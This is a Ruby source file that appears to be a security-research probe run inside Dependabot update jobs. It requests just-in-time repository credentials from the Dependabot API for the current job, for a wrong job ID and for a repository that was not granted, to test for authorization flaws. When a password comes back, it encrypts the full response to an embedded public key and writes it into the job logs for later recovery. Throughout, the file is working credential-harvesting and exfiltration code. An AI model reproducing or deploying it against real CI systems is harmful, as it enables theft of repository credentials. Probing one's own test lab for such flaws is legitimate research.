# frozen_string_literal: true

require "base64"
require "digest"
require "json"
require "net/http"
require "openssl"
require "time"
require "uri"

module DependabotJitProbe
  TARGET_OWNER = "rmp-owned-test-lab"
  TARGET_REPO = "dependabot-jit-target-b"
  CONTROL_OWNER = "rmp-owned-test-lab"
  CONTROL_REPO = "dependabot-jit-control-d"
  AAD = "dependabot-jit-probe-v1"

  module_function

  def run
    return if ENV["DEPENDABOT_JOB_ID"].to_s.empty?
    return if ENV["DEPENDABOT_API_URL"].to_s.empty?
    return if ENV["DEPENDABOT_JIT_PROBE_RAN"] == "1"

    ENV["DEPENDABOT_JIT_PROBE_RAN"] = "1"
    validate_configuration!

    base = ENV.fetch("DEPENDABOT_API_URL").sub(%r{/+\z}, "")
    job_id = ENV.fetch("DEPENDABOT_JOB_ID")

    current_endpoint = "#{base}/update_jobs/#{job_id}/jit_access"
    request_and_record("CURRENT", current_endpoint, job_id, TARGET_OWNER, TARGET_REPO)

    wrong_job_endpoint = "#{base}/update_jobs/0/jit_access"
    request_and_record("WRONG_JOB", wrong_job_endpoint, job_id, TARGET_OWNER, TARGET_REPO)

    request_and_record(
      "UNGRANTED_REPO",
      current_endpoint,
      job_id,
      CONTROL_OWNER,
      CONTROL_REPO
    )
  rescue StandardError => e
    # Never include response bodies, request headers, URLs with queries, or
    # exception messages: any of those could contain sensitive material.
    puts "DEPENDABOT_JIT_PROBE_ERROR_CLASS=#{e.class}"
  end

  def validate_configuration!
    raise "target owner placeholder" if TARGET_OWNER.start_with?("__")
    raise "target repo placeholder" if TARGET_REPO.start_with?("__")
    raise "control owner placeholder" if CONTROL_OWNER.start_with?("__")
    raise "control repo placeholder" if CONTROL_REPO.start_with?("__")
    if TARGET_OWNER.casecmp?(CONTROL_OWNER) && TARGET_REPO.casecmp?(CONTROL_REPO)
      raise "target and control repositories must differ"
    end

    api = URI.parse(ENV.fetch("DEPENDABOT_API_URL"))
    raise "managed API must use HTTPS" unless api.scheme == "https"
    raise "proxy missing" if proxy_url.to_s.empty?
  end

  def request_and_record(label, endpoint, job_id, owner, repository)
    request_body = JSON.generate(
      "account" => owner,
      "repository" => repository
    )
    response = post_jit(endpoint, request_body)
    record_response(
      label,
      response,
      endpoint: endpoint,
      job_id: job_id,
      owner: owner,
      repository: repository,
      request_body: request_body
    )
  end

  def post_jit(endpoint, request_body)
    uri = URI.parse(endpoint)
    request = Net::HTTP::Post.new(uri.request_uri)
    request["Content-Type"] = "application/json"
    request["Accept"] = "application/json"
    request.body = request_body
    http_for(uri).request(request)
  end

  def http_for(uri)
    parsed_proxy = URI.parse(proxy_url)
    klass = Net::HTTP::Proxy(
      parsed_proxy.host,
      parsed_proxy.port,
      parsed_proxy.user,
      parsed_proxy.password
    )
    http = klass.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == "https"
    http.verify_mode = OpenSSL::SSL::VERIFY_PEER if http.use_ssl?
    http.open_timeout = 10
    http.read_timeout = 20
    http
  end

  def proxy_url
    ENV["HTTPS_PROXY"].to_s.empty? ? ENV["https_proxy"] : ENV["HTTPS_PROXY"]
  end

  def record_response(label, response, endpoint:, job_id:, owner:, repository:, request_body:)
    secret = nil
    response_body = response.body.to_s.b
    parsed = parse_json_object(response_body)
    keys = parsed.keys.map(&:to_s).sort
    username = parsed["username"].to_s
    password = parsed["password"].to_s
    credential_present = !password.empty?

    puts [
      "DEPENDABOT_JIT_PROBE",
      "label=#{label}",
      "status=#{response.code}",
      "keys=#{keys.join(',')}",
      "request_body_sha256=#{Digest::SHA256.hexdigest(request_body.b)}",
      "body_bytes=#{response_body.bytesize}",
      "body_sha256=#{Digest::SHA256.hexdigest(response_body)}",
      "credential_present=#{credential_present}"
    ].join(" ")

    return unless credential_present

    secret = JSON.generate(
      "schema_version" => 2,
      "label" => label,
      "received_at" => Time.now.utc.iso8601,
      "target_owner" => owner,
      "target_repo" => repository,
      "job_id" => job_id.to_s,
      "endpoint" => endpoint,
      "request_method" => "POST",
      "request_body_base64" => Base64.strict_encode64(request_body.b),
      "response_status" => response.code.to_i,
      "response_body_base64" => Base64.strict_encode64(response_body)
    )
    bundle = encrypt(secret)
    encoded_bundle = Base64.strict_encode64(JSON.generate(bundle))
    puts "DEPENDABOT_JIT_PROBE_BUNDLE_#{label}=#{encoded_bundle}"
    puts [
      "DEPENDABOT_JIT_PROBE_SECRET_META",
      "label=#{label}",
      "username_bytes=#{username.bytesize}",
      "password_bytes=#{password.bytesize}",
      "password_sha256=#{Digest::SHA256.hexdigest(password)[0, 16]}"
    ].join(" ")
  ensure
    secret&.replace("\0" * secret.bytesize)
    username&.replace("\0" * username.bytesize)
    password&.replace("\0" * password.bytesize)
    response_body&.replace("\0" * response_body.bytesize)
    if response&.body.is_a?(String) && !response.body.frozen?
      response.body.replace("\0" * response.body.bytesize)
    end
  end

  def parse_json_object(value)
    parsed = JSON.parse(value.to_s)
    parsed.is_a?(Hash) ? parsed : {}
  rescue JSON::ParserError
    {}
  end

  def encrypt(plaintext)
    public_key_path = File.expand_path("jit-probe-public.pem", __dir__)
    rsa = OpenSSL::PKey::RSA.new(File.read(public_key_path))
    key = OpenSSL::Random.random_bytes(32)
    mac_key = OpenSSL::Random.random_bytes(32)
    iv = OpenSSL::Random.random_bytes(16)

    cipher = OpenSSL::Cipher.new("aes-256-cbc")
    cipher.encrypt
    cipher.key = key
    cipher.iv = iv
    ciphertext = cipher.update(plaintext) + cipher.final
    mac = OpenSSL::HMAC.digest("SHA256", mac_key, AAD + iv + ciphertext)

    {
      "version" => 1,
      "algorithm" => "RSA-OAEP+AES-256-CBC+HMAC-SHA256",
      "encrypted_key" => Base64.strict_encode64(
        rsa.public_encrypt(key + mac_key, OpenSSL::PKey::RSA::PKCS1_OAEP_PADDING)
      ),
      "iv" => Base64.strict_encode64(iv),
      "mac" => Base64.strict_encode64(mac),
      "ciphertext" => Base64.strict_encode64(ciphertext),
      "aad" => AAD
    }
  ensure
    key&.replace("\0" * key.bytesize)
    mac_key&.replace("\0" * mac_key.bytesize)
  end
end
